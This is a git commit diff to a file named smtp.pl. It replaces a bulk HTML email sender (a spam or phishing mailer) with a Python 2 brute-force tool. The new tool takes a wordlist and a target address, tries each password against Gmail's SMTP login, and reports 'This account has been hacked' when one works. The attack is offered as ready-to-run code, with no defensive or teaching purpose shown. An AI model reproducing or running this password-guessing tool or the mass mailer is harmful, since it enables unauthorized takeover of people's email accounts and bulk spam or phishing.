db0746df34940bd16b2187d1f18e8e77dce19290
jalang <35096599+jalang11@users.noreply.github.com>
2019-10-04 13:50:44 +0700

    Update smtp.pl

--- smtp.pl
+++ smtp.pl
@@ -1,128 +1,76 @@
-#!/usr/bin/env python
-
-# -*- coding: utf-8 -*-
+# #!/usr/bin/python
+# '''coded by ElectronSz'''
 
 import smtplib
+from os import system
 
-from email.MIMEMultipart import MIMEMultipart
+def main():
+   print '================================================='
+   print '              Script by ElectronSz               '
+   print '================================================='
+   print '               ++++++++++++++++++++              '
+   print '\n                                               '
+   print '  _,.                                            '
+   print '                                                 '
+   print '                                                 '
+   print '                                                 '
+   print '       _,.                   '
+   print '     ,` -.)                  '
+   print '    ( _/-\\-._               '
+   print '   /,|`--._,-^|            , '
+   print '   \_| |`-._/||          , | '
+   print '     |  `-, / |         /  / '
+   print '     |     || |        /  /  '
+   print '      `r-._||/   __   /  /   '
+   print '  __,-<_     )`-/  `./  /    '
+   print '  \   `---    \   / /  /     '
+   print '     |           |./  /      '
+   print '     /           //  /       '
+   print ' \_/  \         |/  /        '
+   print '  |    |   _,^- /  /         '
+   print '  |    , ``  (\/  /_         '
+   print '   \,.->._    \X-=/^         '
+   print '   (  /   `-._//^`           '
+   print '    `Y-.____(__}             '
+   print '     |     {__)              ' 
+   print '           ()                '
 
-from email.MIMEText import MIMEText
-
-def checkConnection(server, port, tls, user, passwd):
-
-    try:
-
-        connect = smtplib.SMTP(server, port)
-
-        connect.ehlo()
-
-        if tls:
-
-          connect.starttls()
-
-          connect.ehlo()
-
-        connect.login(user, passwd)
-        
-        return connect
-
-    except:
-
-        return False
-
-def inboxEmail(server, port, tls, user, passwd, maillist, From, subject, mailtext):
-
-    smtpConnect = checkConnection(server, port, tls, user, passwd)
-
-    emails = len(maillist)
-
-    for success, sendto in enumerate(maillist):
-
-        content = MIMEMultipart()
-
-        content['From'] = From
-
-        content['To'] = sendto.rstrip()
-
-        content['Subject'] = subject
-
-        htmlscript = mailtext.rstrip()
-
-        content.attach(MIMEText(htmlscript, 'html'))
-
-        print('Pr0 SMTP Email Sender >>> You are going to send to '+sendto.rstrip())
-
-        smtpConnect.sendmail(From, sendto.rstrip(), content.as_string())
-
-    smtpConnect.quit()
-
-    print('\nBastians Email Sender >>> Email to '+str(success+1)+'/'+str(emails)+' Adresses sended!\n')
-
-print"""
-______     _____   _____           ______ _____      
-| ___ \   |  _  | /  ___|          |  _  \____ |     
-| |_/ / __| |/' | \ `--.  ___ _ __ | | | |   / /_ __ 
-|  __/ '__|  /| |  `--. \/ _ \ '_ \| | | |   \ \ '__|
-| |  | |  \ |_/ / /\__/ /  __/ | | | |/ /.___/ / |   
-\_|  |_|   \___/  \____/ \___|_| |_|___/ \____/|_|      
-                                  Version v1.0 By WhoAmi 
-                                         CLAY TeaM                    
-                                                          """
-
-print('# GreeTz To : All My Friends & CLAY Members & FsocietyTN Members')
-
-print('')
-
-smtpServer = raw_input('\nPlease enter the SMTP Server (Hostname or IP Adress): ')
-
-smtpPort = input('Please enter the SMTP Port : ')
-
-smtpTLS = input('Secure the Email with TLS ? (Yes [1] or No [0]): ')
-
-smtpUser = raw_input('Enter the SMTP Username: ')
-
-smtpPass = raw_input('Enter the SMTP Password: ')
-
-if checkConnection(smtpServer, smtpPort, smtpTLS, smtpUser, smtpPass,):
-
-    print('\nPr0 SMTP Email Sender >>> SMTP Status // Connected!')
-
-    sendFrom = raw_input('\nEnter the Receiver: ')
-
-    sendSubj = raw_input('Enter the Subject: ')
-
-    userlist = raw_input('Enter the Path of the Email List: ')
-
-    try:
-
-        maillist = open(userlist).readlines()
-
-        print('\n Pr0 SMTP Email Sender >>> I found currently '+str(len(maillist))+' Email Adresses.')
-
-        htmlscript = raw_input('\nEnter here the Path to your HTML Script: ')
-
-        try:
-
-            html = open(htmlscript).read()
-
-            raw_input('ENTER, to send the HTML Script to '+str(len(maillist))+' ...\n')
-
-            try:
-
-                inboxEmail(smtpServer, smtpPort, smtpTLS, smtpUser, smtpPass, maillist, sendFrom, sendSubj, html)
-
-            except:
-
-                print('ERROR: I CANT USE THE EMAIL!')
-
-        except:
-
-            print('The HTML File cannot get readed yet or is empty.')
-
-    except:
-
-        print('The .txt File cannot get readed or is empty.')
-
+main()
+print '[1] Start the brute force attack'
+print '[2] Exit'
+option = input('==>')
+if option == 1:
+   file_path = raw_input('Enter the path of wordlist file :')
 else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
 
-    print('I cant connect to the Server :/')
+#login function to initiate forced login
+def login():
+    i = 0
+    user_name = raw_input('Enter the target email :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This account has been hacked, password :' + password + '     ^_^'
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
+            print '[+] This account has been hacked, password :' + password + '     ^_^'
+
+            break
+         else:
+            print '[!] Password not found => ' + password
+login()
